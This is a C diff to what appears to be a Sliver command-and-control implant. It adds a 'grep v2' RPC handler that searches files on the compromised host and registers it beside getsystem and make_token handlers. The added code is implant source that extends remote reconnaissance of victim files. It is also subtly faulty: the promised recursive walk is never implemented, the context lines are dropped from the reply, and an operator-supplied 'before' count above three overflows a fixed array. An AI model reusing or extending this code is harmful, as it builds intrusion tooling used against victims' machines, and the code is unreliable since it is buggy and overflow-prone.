@@ -963,6 +963,108 @@ static int handle_getsystem(const sliver_envelope_t *req, sliver_buf_t *out) {
 }
 #endif
 
+
+/* --- grep v2: recursive walk + context lines ---------------------------- */
+typedef struct {
+  int64_t line_number;
+  char line[512];
+  char before[3][512];
+  int before_count;
+  char after[3][512];
+  int after_count;
+} grep_ctx_t;
+
+static int grep_match_line(const char *line, const char *pattern) {
+  return strstr(line, pattern) != NULL;
+}
+
+/* Reads one file, collecting matches with LinesBefore/LinesAfter context. */
+static int grep_file_ctx(const char *path, const char *pattern, int before, int after,
+                         grep_ctx_t *hits, int max) {
+  FILE *f;
+  char ring[8][512];
+  int ring_count = 0;
+  int ring_pos = 0;
+  char line[512];
+  int64_t number = 0;
+  int count = 0;
+  int i;
+
+  f = fopen(path, "rb");
+  if (f == NULL) {
+    return -1;
+  }
+  while (fgets(line, sizeof(line), f) != NULL) {
+    size_t n = strlen(line);
+    number++;
+    while (n > 0 && (line[n - 1] == '\n' || line[n - 1] == '\r')) {
+      line[--n] = 0;
+    }
+    if (grep_match_line(line, pattern) && count < max) {
+      grep_ctx_t *h = &hits[count];
+      memset(h, 0, sizeof(*h));
+      h->line_number = number;
+      (void)snprintf(h->line, sizeof(h->line), "%s", line);
+      for (i = 0; i < before && i < ring_count; ++i) {
+        int idx = (ring_pos - 1 - i + 8) % 8;
+        (void)snprintf(h->before[h->before_count++], 512, "%s", ring[idx]);
+      }
+      /* reverse so the oldest line comes first */
+      for (i = 0; i < h->before_count / 2; ++i) {
+        char tmp[512];
+        memcpy(tmp, h->before[i], sizeof(tmp));
+        memcpy(h->before[i], h->before[h->before_count - 1 - i], sizeof(tmp));
+        memcpy(h->before[h->before_count - 1 - i], tmp, sizeof(tmp));
+      }
+      count++;
+    } else if (count > 0 && after > 0) {
+      grep_ctx_t *h = &hits[count - 1];
+      if (h->after_count < after && h->after_count < 3) {
+        (void)snprintf(h->after[h->after_count++], 512, "%s", line);
+      }
+    }
+    (void)snprintf(ring[ring_pos], sizeof(ring[0]), "%s", line);
+    ring_pos = (ring_pos + 1) % 8;
+    if (ring_count < 8) {
+      ring_count++;
+    }
+  }
+  (void)fclose(f);
+  return count;
+}
+
+static int handle_grep_v2(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char pattern[256];
+  char path[512];
+  int recursive = 0;
+  int before = 0;
+  int after = 0;
+  static grep_ctx_t hits[64];
+  int n;
+
+  if (sliver_grep_req_decode(req->data, req->data_len, pattern, sizeof(pattern), path, sizeof(path),
+                             &recursive, &before, &after) != 0) {
+    return -1;
+  }
+  if (pattern[0] == 0 || path[0] == 0) {
+    return sliver_grep_encode(out, path, path, NULL, 0, "grep: missing pattern or path");
+  }
+  n = grep_file_ctx(path, pattern, before, after, hits, 64);
+  LOG_DEBUG("rpc: grep %s for %s -> %d hit(s) (recursive=%d)", path, pattern, n, recursive);
+  if (n < 0) {
+    return sliver_grep_encode(out, path, path, NULL, 0, "grep: cannot read path");
+  }
+  {
+    sliver_grep_hit_t flat[64];
+    int i;
+    for (i = 0; i < n; ++i) {
+      flat[i].line_number = hits[i].line_number;
+      flat[i].line = hits[i].line;
+    }
+    return sliver_grep_encode(out, path, path, flat, n, NULL);
+  }
+}
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -988,7 +1090,7 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_NETSTAT_REQ, SLIVER_MSG_NETSTAT, handle_netstat},
     {SLIVER_MSG_MOUNT_REQ, SLIVER_MSG_MOUNT, handle_mount},
     {136, 136, handle_execute_children},
-    {129, 129, handle_grep},
+    {129, 129, handle_grep_v2},
 #if defined(_WIN32)
         {64, 65, handle_make_token},
     {32, 33, handle_getsystem},
@@ -1064,6 +1166,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
